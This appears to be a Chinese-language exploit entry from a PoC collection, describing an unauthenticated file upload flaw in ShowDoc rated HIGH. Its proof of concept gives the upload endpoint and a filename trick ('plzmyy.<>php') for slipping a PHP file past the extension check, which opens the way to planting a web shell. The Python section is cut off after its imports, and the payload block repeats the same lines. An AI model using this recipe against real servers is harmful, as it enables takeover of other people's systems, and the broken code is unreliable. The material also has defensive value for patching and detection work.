# ShowDoc 前台文件上传漏洞

## 漏洞描述
参考链接：

- https://github.com/star7th/showdoc/pull/1059

## 危害等级
HIGH

## 参考链接
- https://github.com/star7th/showdoc/pull/1059

## 漏洞复现方法
poc：

```
POST /server/index.php?s=/home/page/uploading HTTP/1.1
上传图片，并抓包，将文件名改为plzmyy.<>php
```

```python
import requests
requests.packages.urllib3.disable_warnings()

## Payloads
```
POST /server/index.php?s=/home/page/uploading HTTP/1.1
上传图片，并抓包，将文件名改为plzmyy.<>php
```
